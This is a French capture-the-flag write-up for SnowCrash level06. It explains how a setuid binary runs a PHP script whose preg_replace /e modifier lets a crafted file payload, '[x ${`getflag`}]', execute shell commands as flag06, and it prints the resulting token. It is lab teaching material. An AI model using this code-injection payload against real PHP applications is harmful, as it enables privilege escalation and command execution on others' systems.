En listant les fichiers, on trouve un binaire et un fichier PHP.
```bash
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

Ici le fichier binaire n'est pas intéressant, est exécute juste le fichier PHP avec les droits de **flag06**.

```bash
level06@SnowCrash:~$ cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

On remarque beaucoup d'expressions régulières et l'utilisation de argv.

En faisant un peu de désobfuscation, on obtient un script plus lisible.
```php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

Le script prend en argument un fichier, qu'il va lire puis remplace certaines parties du texte par d'autres.

Ici ce qui nous intéresse est le modifier **e** du regex de la fonction x, qui permet d'exécuter du code.

Créons un fichier temporaire `/tmp/t` avec le contenu :
```bash
[x ${`getflag`}]
```

- `[x ...]` : délimite le motif reconnu par l'expression régulière.
- ``${`getflag`}`` : syntaxe PHP permettant d'exécuter `getflag` en shell via les backticks.

```bash
echo "[x \${\`getflag\`}]" > /tmp/t
```

Puis on exécute le binaire sur ce lien.
```bash
level06@SnowCrash:~$ ./level06 /tmp/t
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

Une erreur est créée à l'exécution par l'interpréteur PHP vu qu'on a inséré un bout de code à l'arrache, mais on s'en fiche vu qu'on a le flag.
